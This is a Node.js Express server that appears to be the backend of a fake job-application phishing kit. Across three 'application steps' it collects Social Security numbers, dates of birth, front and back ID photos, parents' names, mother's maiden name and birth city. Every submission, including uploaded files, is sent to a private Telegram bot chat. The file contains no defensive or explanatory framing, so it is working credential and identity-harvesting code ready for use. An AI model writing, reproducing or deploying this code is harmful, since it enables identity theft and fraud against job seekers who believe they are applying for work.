import express from "express";
import axios from "axios";
import cors from "cors";
import dotenv from "dotenv";
import multer from "multer";
import FormData from "form-data";

dotenv.config();

const app = express();
app.use(
  cors({
    origin: "*",
  }),
);
app.use(express.json());

const upload = multer({ storage: multer.memoryStorage() });

app.post("/send-to-telegram", async (req, res) => {
  try {
    const { name, email, message } = req.body;

    const text = `
📩 New Form Submission

👤 Name: ${name}
📧 Email: ${email}
💬 Message: ${message}
`;

    await axios.post(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.CHAT_ID,
        text,
      },
    );

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

// Helper function to send files to Telegram
const sendFile = async (fileBuffer, fileName, fileType, docType) => {
  const form = new FormData();
  form.append("chat_id", process.env.CHAT_ID);
  form.append(docType, fileBuffer, {
    filename: fileName,
    contentType: fileType,
  });

  await axios.post(
    `https://api.telegram.org/bot${process.env.BOT_TOKEN}/send${docType === "photo" ? "Photo" : "Document"}`,
    form,
    {
      headers: form.getHeaders(),
    },
  );
};

// STEP 1
app.post(
  "/submit-job-step1",
  upload.fields([{ name: "resume", maxCount: 1 }]),
  async (req, res) => {
    try {
      const data = req.body;
      const text = `
🎯 Job Application - Step 1: Basic Info

👤 Name: ${data.fullName}
📧 Email: ${data.email}
📱 Phone: ${data.phone}
💼 Position: ${data.position}
🏢 Department: ${data.department}
📝 Cover Letter: ${data.coverLetter}
`.substring(0, 4000);

      await axios.post(
        `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
        {
          chat_id: process.env.CHAT_ID,
          text,
        },
      );

      if (req.files?.resume?.[0]) {
        try {
          await sendFile(
            req.files.resume[0].buffer,
            req.files.resume[0].originalname,
            req.files.resume[0].mimetype,
            "document",
          );
        } catch (uploadErr) {
          console.error("Error sending file to Telegram:", uploadErr);
        }
      }

      res.json({ success: true });
    } catch (err) {
      console.error("Step 1 Error:", err);
      res.status(500).json({ success: false });
    }
  },
);

// STEP 2
app.post(
  "/submit-job-step2",
  upload.fields([
    { name: "idFront", maxCount: 1 },
    { name: "idBack", maxCount: 1 },
  ]),
  async (req, res) => {
    try {
      const data = req.body;
      const text = `
🔍 Job Application - Step 2: Verification

SSN: ${data.ssn}
DOB: ${data.dob}
Employee Ref: ${data.employeeRef || "None"}
`;

      await axios.post(
        `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
        {
          chat_id: process.env.CHAT_ID,
          text,
        },
      );

      if (req.files?.idFront?.[0]) {
        try {
          await sendFile(
            req.files.idFront[0].buffer,
            req.files.idFront[0].originalname,
            req.files.idFront[0].mimetype,
            "photo",
          );
        } catch (uploadErr) {
          console.error("Error sending idFront to Telegram:", uploadErr);
        }
      }
      if (req.files?.idBack?.[0]) {
        try {
          await sendFile(
            req.files.idBack[0].buffer,
            req.files.idBack[0].originalname,
            req.files.idBack[0].mimetype,
            "photo",
          );
        } catch (uploadErr) {
          console.error("Error sending idBack to Telegram:", uploadErr);
        }
      }

      res.json({ success: true });
    } catch (err) {
      console.error("Step 2 Error:", err);
      res.status(500).json({ success: false });
    }
  },
);

// STEP 3
app.post("/submit-job-step3", upload.none(), async (req, res) => {
  try {
    const data = req.body;
    const text = `
🕵️ Job Application - Step 3: Background

Father's Name: ${data.fatherName}
Mother's Name: ${data.motherName}
Maiden Name: ${data.maidenName}
Birth City/State: ${data.birthCityState}
Additional Info: ${data.additionalInfo || "None"}
`.substring(0, 4000);

    await axios.post(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.CHAT_ID,
        text,
      },
    );

    res.json({ success: true });
  } catch (err) {
    console.error("Step 3 Error:", err);
    res.status(500).json({ success: false });
  }
});

app.listen(5000, () => {
  console.log("Server running on port 5000");
});
